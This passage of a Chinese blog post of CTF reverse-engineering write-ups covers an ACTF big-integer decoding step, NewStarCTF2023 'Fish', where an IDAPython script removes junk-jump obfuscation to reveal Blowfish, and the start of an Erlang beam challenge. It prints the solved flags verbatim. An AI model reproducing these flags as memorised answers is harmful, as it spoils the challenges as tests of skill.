class="number">2048</span>]; <span class="comment">// [rsp+850h] [rbp+830h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v13[<span class="number">2048</span>]; <span class="comment">// [rsp+1050h] [rbp+1030h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v14[<span class="number">2048</span>]; <span class="comment">// [rsp+1850h] [rbp+1830h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v15[<span class="number">3584</span>]; <span class="comment">// [rsp+2050h] [rbp+2030h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v16[<span class="number">2024</span>]; <span class="comment">// [rsp+2E50h] [rbp+2E30h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v17; <span class="comment">// [rsp+3638h] [rbp+3618h]</span></span><br><span class="line"></span><br><span class="line">  v3 = &amp;v9;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">3086</span>i64; i; --i )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_DWORD *)v3 = <span class="number">-858993460</span>;</span><br><span class="line">    v3 += <span class="number">4</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  j___CheckForDebuggerJustMyCode(&amp;unk_7FF7ECAF60F2, a2, a3);</span><br><span class="line">  sub_7FF7ECAD14B5((__int64)v10);</span><br><span class="line">  <span class="keyword">for</span> ( v11[<span class="number">0</span>] = <span class="number">0</span>; ; ++v11[<span class="number">0</span>] )                <span class="comment">// 对base64input转换</span></span><br><span class="line">  &#123;</span><br><span class="line">    v17 = v11[<span class="number">0</span>];</span><br><span class="line">    v5 = STRLEN_0(a2);</span><br><span class="line">    <span class="keyword">if</span> ( v17 &gt;= v5 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    sub_7FF7ECAD16E5(v12, <span class="number">128</span>i64);              <span class="comment">// 128： ascii码</span></span><br><span class="line">    sub_7FF7ECAD1578(v12, v13, v11);</span><br><span class="line">    v6 = (<span class="type">char</span> *)sub_7FF7ECAD1118(a2, v11[<span class="number">0</span>]);</span><br><span class="line">    sub_7FF7ECAD16E5(v14, (<span class="type">unsigned</span> <span class="type">int</span>)*v6);</span><br><span class="line">    j_MUL(v14, v15, v13);</span><br><span class="line">    v7 = j_ADD(v10, v16, v15);</span><br><span class="line">    STR_COPY((__int64)v10, v7);</span><br><span class="line">  &#125;</span><br><span class="line">  STR_COPY_0(a1, (__int64)v10);</span><br><span class="line">  sub_7FF7ECAD119A(a2);</span><br><span class="line">  <span class="keyword">return</span> a1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其实就是将base64input的每个ASCII码以128进制变成大整数</p><p>所以最后得到的大整数除128取余就能得到base64input</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">keys = [<span class="number">0</span>,</span><br><span class="line">        <span class="number">64584540291872516627894939590684951703479643371381420434698676192916126802789388</span>,</span><br><span class="line">        <span class="number">11783410410469738048283152171898507679537812634841032055361622989575562121323526</span>,</span><br><span class="line">        <span class="number">55440851777679184418972581091796582321001517732868509947716453414109025036506793</span>,</span><br><span class="line">        <span class="number">17867047589171477574847737912328753108849304549280205992204587760361310317983607</span>,</span><br><span class="line">        <span class="number">7537302706582391238853817483600228733479333152488218477840149847189049516952787</span>,</span><br><span class="line">        <span class="number">80793226935699295824618519685638809874579343342564712419235587177713165502121664</span>,</span><br><span class="line">        <span class="number">14385283226689171523445844388769467232023411467394422980403729848631619308579599</span>,</span><br><span class="line">        <span class="number">55079029772840138145785005601340325789675668817561045403173659223377346727295749</span>,</span><br><span class="line">        <span class="number">71119332457202863671922045224905384620742912949065190274173724688764272313900465</span>,</span><br><span class="line">        <span class="number">57705573952449699620072104055030025886984180500734382250587152417040141679598894</span>]</span><br><span class="line">key11 = <span class="number">834572051814337070469744559761199605121805728622619480039894407167152612470842477813941120780374570205930952883661000998715107231695919001238818879944773516507366865633886966330912156402063735306303966193481658066437563587241718036562480496368592194719092339868512773222711600878782903109949779245500098606570248830570792028831133949440164219842871034275938433</span></span><br><span class="line">t = <span class="number">0</span></span><br><span class="line">t += key11</span><br><span class="line">t += keys[<span class="number">10</span>]</span><br><span class="line">t -= keys[<span class="number">9</span>]</span><br><span class="line">t += keys[<span class="number">8</span>]</span><br><span class="line">t -= keys[<span class="number">7</span>]</span><br><span class="line">t += keys[<span class="number">6</span>]</span><br><span class="line">t //= keys[<span class="number">5</span>]</span><br><span class="line">t -= keys[<span class="number">4</span>]</span><br><span class="line">t += keys[<span class="number">3</span>]</span><br><span class="line">t //= keys[<span class="number">2</span>]</span><br><span class="line">t -= keys[<span class="number">1</span>]</span><br><span class="line"><span class="built_in">print</span>(t)</span><br><span class="line"><span class="keyword">while</span> t%<span class="number">128</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(t%<span class="number">128</span>),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    t//=<span class="number">128</span></span><br><span class="line"><span class="comment"># QUNURntkcjBwcDNyXzFzX3YzcnlfaW50M3Izc3QxbmdfMWQ3YTkwYTYzMDM5ODMxYzdmY2FhNTNiNzY2ZDViMmQhISEhIX0=</span></span><br><span class="line"><span class="comment"># ACTF&#123;dr0pp3r_1s_v3ry_int3r3st1ng_1d7a90a63039831c7fcaa53b766d5b2d!!!!!&#125;</span></span><br></pre></td></tr></table></figure><hr><hr><p>真就ACTF的easy难度(指31solves)。。。 orz<br>水平还差很多 还得继续学</p><h1 id="NewStarCTF2023-Week5"><a href="#NewStarCTF2023-Week5" class="headerlink" title="NewStarCTF2023 Week5"></a>NewStarCTF2023 Week5</h1><p>这就是 “<strong>新生赛</strong>“ 难度吗??? 。。。</p><h2 id="Fish"><a href="#Fish" class="headerlink" title="Fish"></a>Fish</h2><p>隔了好久再来看熟练多了<br>IDA打开 main啥都没有<br>看汇编<br>大量的这种类型的花指令</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">0000000000401</span>A12                 jz      <span class="type">short</span> near ptr loc_401A16+<span class="number">1</span></span><br><span class="line">.text:<span class="number">0000000000401</span>A14                 jnz     <span class="type">short</span> near ptr loc_401A16+<span class="number">1</span></span><br></pre></td></tr></table></figure><p>以前我的做法是将这两个全部patch掉 但这种只适用于一两个这种❀的情况<br>如果有很多的话这种patch会影响到IDA对后续语句的识别 比如这题如果这么patch那么关键常量就找不到了<br>正确做法是将jnz后的那个指令字节patch为nop(90)<br>为了方便批量化操作 general打开操作码显示</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">0000000000401</span>A12 <span class="number">74</span> <span class="number">03</span>                                   jz      <span class="type">short</span> near ptr loc_401A16+<span class="number">1</span></span><br><span class="line">.text:<span class="number">0000000000401</span>A14 <span class="number">75</span> <span class="number">01</span>                                   jnz     <span class="type">short</span> near ptr loc_401A16+<span class="number">1</span></span><br><span class="line">.text:<span class="number">0000000000401</span>A16</span><br></pre></td></tr></table></figure><p>当我们识别到 74 75 后将之后的位置设为90即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">start = <span class="number">0x4019FC</span></span><br><span class="line">end = <span class="number">0x401AD8</span></span><br><span class="line"><span class="keyword">while</span> start&lt;end:</span><br><span class="line">    <span class="keyword">if</span>((get_wide_byte(start)==<span class="number">0x74</span>) <span class="keyword">and</span> (get_wide_byte(start+<span class="number">2</span>)==<span class="number">0x75</span>)):</span><br><span class="line">        ida_bytes.patch_byte(start+<span class="number">4</span>,<span class="number">0x90</span>)</span><br><span class="line">    start += <span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] OK !&quot;</span>)</span><br></pre></td></tr></table></figure><p>这样patch后再将main全部选中按C Force一下就可以得到正常的源码了<br>这样的话汇编大致是这种形式</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">0000000000401</span>A17                                                                 ; sub_4019FE+<span class="number">16</span>↑j</span><br><span class="line">.text:<span class="number">0000000000401</span>A17 <span class="number">48</span> B8 <span class="number">4</span>E <span class="number">65</span> <span class="number">77</span> <span class="number">53</span> <span class="number">74</span> <span class="number">61</span>                 mov     rax, <span class="number">7261745377654</span>Eh</span><br><span class="line">.text:<span class="number">0000000000401</span>A17 <span class="number">72</span> <span class="number">00</span></span><br><span class="line">.text:<span class="number">0000000000401</span>A21 <span class="number">48</span> <span class="number">89</span> <span class="number">45</span> <span class="number">10</span>                             mov     [rbp+<span class="number">30</span>h+var_20], rax</span><br><span class="line">.text:<span class="number">0000000000401</span>A25 <span class="number">74</span> <span class="number">03</span>                                   jz      <span class="type">short</span> loc_401A2A</span><br><span class="line">.text:<span class="number">0000000000401</span>A27 <span class="number">75</span> <span class="number">01</span>                                   jnz     <span class="type">short</span> loc_401A2A</span><br><span class="line">.text:<span class="number">0000000000401</span>A29 <span class="number">90</span>                                      nop</span><br></pre></td></tr></table></figure><p>可以看到这里mov rax … 这里的值就是 <code>NewStar</code> 这是最初patch会影响到的语句块！<br>然后main是这个样子</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// positive sp value has been detected, the output may be wrong!</span></span><br><span class="line">__int64 __fastcall <span class="title function_">sub_4019FE</span><span class="params">(__int64 a1, __int64 a2, __int64 a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> Str1[<span class="number">96</span>]; <span class="comment">// [rsp+20h] [rbp-60h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [rsp+80h] [rbp+0h]</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [rsp+84h] [rbp+4h] BYREF</span></span><br><span class="line">  __int64 v7[<span class="number">4</span>]; <span class="comment">// [rsp+90h] [rbp+10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  sub_402660(a1, a2, a3);</span><br><span class="line">  v7[<span class="number">0</span>] = <span class="number">0x7261745377654E</span>i64;</span><br><span class="line">  <span class="built_in">memset</span>(Str1, <span class="number">0</span>, <span class="keyword">sizeof</span>(Str1));</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  sub_401951(<span class="number">0</span>i64, &amp;v6);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, Str1);</span><br><span class="line">  sub_4016C1(v7);</span><br><span class="line">  ((<span class="type">void</span> (__fastcall *)(<span class="type">char</span> *))sub_40188B)(Str1);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(Str1, &amp;Str2) )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;WOW!&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;I believe you can do it!&quot;</span>);</span><br><span class="line">  system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>i64;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>用FindCrypt插件Ctrl+F一看发现是BlowFish加密<br>在strcmp那儿可以拿到check值 key猜测是 “NewStar”<br>找个<a href="https://www.lddgo.net/encrypt/blowfish" target="_blank">在线网站</a>解就完了<br>注意选择 nopadding</p><p>flag : flag{YouGotit!!Yougoit!!!!TheFifthPZGALAXYLEVEL}</p><p>其实最后发现可以将整个程序按照这种patch处理后Force一下能看到完整程序流<br>MAIN</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">MAIN</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> Str1[<span class="number">96</span>]; <span class="comment">// [rsp+20h] [rbp-60h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [rsp+80h] [rbp+0h]</span></span><br><span class="line">  __int64 v6[<span class="number">4</span>]; <span class="comment">// [rsp+90h] [rbp+10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  sub_402660(argc, argv, envp);</span><br><span class="line">  v6[<span class="number">0</span>] = <span class="number">0x7261745377654E</span>i64;</span><br><span class="line">  <span class="built_in">memset</span>(Str1, <span class="number">0</span>, <span class="keyword">sizeof</span>(Str1));</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  sub_401951();</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, Str1);</span><br><span class="line">  sub_4016C1((<span class="type">const</span> <span class="type">char</span> *)v6);</span><br><span class="line">  sub_40188B(Str1);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(Str1, (<span class="type">const</span> <span class="type">char</span> *)&amp;loc_40403F + <span class="number">1</span>) )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;WOW!&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;I believe you can do it!&quot;</span>);</span><br><span class="line">  system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>sub_4016C1 应该就是根据NewStar来生成后续密钥</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> *__fastcall <span class="title function_">sub_4016C1</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [rsp+24h] [rbp-1Ch] BYREF</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+28h] [rbp-18h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+2Ch] [rbp-14h]</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [rsp+30h] [rbp-10h]</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [rsp+34h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+3Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  result = (<span class="type">char</span> *)<span class="built_in">strlen</span>(a1);</span><br><span class="line">  v4 = (<span class="type">int</span>)result;</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  j = <span class="number">0</span>;</span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( j &lt;= <span class="number">17</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v5 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">3</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      v5 = (v5 &lt;&lt; <span class="number">8</span>) | (<span class="type">unsigned</span> __int8)a1[v6];</span><br><span class="line">      v6 = (v6 + <span class="number">1</span>) % v4;</span><br><span class="line">    &#125;</span><br><span class="line">    result = (<span class="type">char</span> *)&amp;loc_40407F + <span class="number">1</span>;</span><br><span class="line">    *(_DWORD *)((<span class="type">char</span> *)&amp;loc_40407F + <span class="number">4</span> * j++ + <span class="number">1</span>) ^= v5;</span><br><span class="line">  &#125;</span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  v2 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">17</span>; j += <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_4015DE(&amp;v3, &amp;v2);</span><br><span class="line">    *(_DWORD *)((<span class="type">char</span> *)&amp;loc_40407F + <span class="number">4</span> * j + <span class="number">1</span>) = v3;</span><br><span class="line">    result = (<span class="type">char</span> *)&amp;loc_40407F + <span class="number">1</span>;</span><br><span class="line">    *(_DWORD *)((<span class="type">char</span> *)&amp;loc_40407F + <span class="number">4</span> * j + <span class="number">5</span>) = v2;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">3</span>; ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">255</span>; i += <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_4015DE(&amp;v3, &amp;v2);</span><br><span class="line">      *(_DWORD *)((<span class="type">char</span> *)&amp;loc_4040FF + <span class="number">1024</span> * (__int64)j + <span class="number">4</span> * i + <span class="number">1</span>) = v3;</span><br><span class="line">      result = (<span class="type">char</span> *)&amp;loc_4040FF + <span class="number">1</span>;</span><br><span class="line">      *(_DWORD *)((<span class="type">char</span> *)&amp;loc_4040FF + <span class="number">1024</span> * (__int64)j + <span class="number">4</span> * i + <span class="number">5</span>) = v2;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>sub_40188B 标准BlowFish加密</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_40188B</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  _DWORD *v1; <span class="comment">// rbx</span></span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v3; <span class="comment">// [rsp+24h] [rbp-5Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v4; <span class="comment">// [rsp+28h] [rbp-58h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [rsp+2Ch] [rbp-54h]</span></span><br><span class="line">  <span class="type">char</span> *v6; <span class="comment">// [rsp+30h] [rbp-50h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [rsp+3Ch] [rbp-44h]</span></span><br><span class="line"></span><br><span class="line">  v5 = <span class="built_in">strlen</span>(a1) / <span class="number">8</span>;</span><br><span class="line">  v6 = (<span class="type">char</span> *)a1;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    result = i;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">int</span>)i &gt;= v5 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v4 = sub_403000(*(<span class="type">unsigned</span> <span class="type">int</span> *)v6);</span><br><span class="line">    v3 = sub_403000(*((<span class="type">unsigned</span> <span class="type">int</span> *)v6 + <span class="number">1</span>));</span><br><span class="line">    sub_4015DE(&amp;v4, &amp;v3);</span><br><span class="line">    *(_DWORD *)v6 = sub_403000(v4);</span><br><span class="line">    v1 = v6 + <span class="number">4</span>;</span><br><span class="line">    *v1 = sub_403000(v3);</span><br><span class="line">    v6 += <span class="number">8</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在sub_4015DE中可以看到BlowFish的常量 0x9216D5D9 和 0x8979FB1B(dword_4040C4)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span> *__fastcall <span class="title function_">sub_4015DE</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> *a1, <span class="type">unsigned</span> <span class="type">int</span> *a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> *result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v3; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v4; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+2Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">15</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    *a1 ^= *(_DWORD *)((<span class="type">char</span> *)&amp;loc_40407F + <span class="number">4</span> * i + <span class="number">1</span>);</span><br><span class="line">    *a2 ^= sub_401530(*a1);</span><br><span class="line">    v3 = *a1;</span><br><span class="line">    *a1 = *a2;</span><br><span class="line">    *a2 = v3;</span><br><span class="line">  &#125;</span><br><span class="line">  v4 = *a1;</span><br><span class="line">  *a1 = *a2;</span><br><span class="line">  *a2 = v4;</span><br><span class="line">  *a2 ^= <span class="number">0x9216D5D9</span>;</span><br><span class="line">  result = a1;</span><br><span class="line">  *a1 ^= dword_4040C4;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Genshin"><a href="#Genshin" class="headerlink" title="Genshin"></a>Genshin</h2><p>考察的是erlang beam文件逆向<br>先下载好erlang编译器工具<br>然后通过这种方式(搜了一圈也不知道怎么找到这条反汇编命令的…)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">io:format(<span class="string">&quot;~p~n&quot;</span>,[beam_disasm:file(<span class="string">&quot;genshin.beam&quot;</span>)]).</span><br></pre></td></tr></table></figure><p>注意结尾要有’.’ !!!<br>可以得到文件的字节码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line">&#123;beam_file,genshin,</span><br><span class="line">    [&#123;main,<span class="number">1</span>,<span class="number">2</span>&#125;,&#123;module_info,<span class="number">0</span>,<span class="number">11</span>&#125;,&#123;module_info,<span class="number">1</span>,<span class="number">13</span>&#125;],</span><br><span class="line">    [&#123;vsn,[<span class="number">294325075297162417208450880208266398775</span>]&#125;],</span><br><span class="line">    [&#123;version,<span class="string">&quot;8.3.1&quot;</span>&#125;,</span><br><span class="line">     &#123;options,[]&#125;,</span><br><span class="line">     &#123;source,</span><br><span class="line">         [<span class="number">47</span>,<span class="number">109</span>,<span class="number">110</span>,<span class="number">116</span>,<span class="number">47</span>,<span class="number">100</span>,<span class="number">47</span>,<span class="number">67</span>,<span class="number">84</span>,<span class="number">70</span>,<span class="number">47</span>,<span class="number">20986</span>,<span class="number">39064</span>,<span class="number">47</span>,<span class="number">50</span>,<span class="number">48</span>,<span class="number">50</span>,<span class="number">51</span>,<span class="number">45</span>,</span><br><span class="line">          <span class="number">56</span>,<span class="number">45</span>,<span class="number">100</span>,<span class="number">117</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">101</span>,<span class="number">105</span>,<span class="number">115</span>,<span class="number">97</span>,<span class="number">105</span>,<span class="number">47</span>,<span class="number">103</span>,<span class="number">101</span>,<span class="number">110</span>,<span class="number">115</span>,<span class="number">104</span>,<span class="number">105</span>,</span><br><span class="line">          <span class="number">110</span>,<span 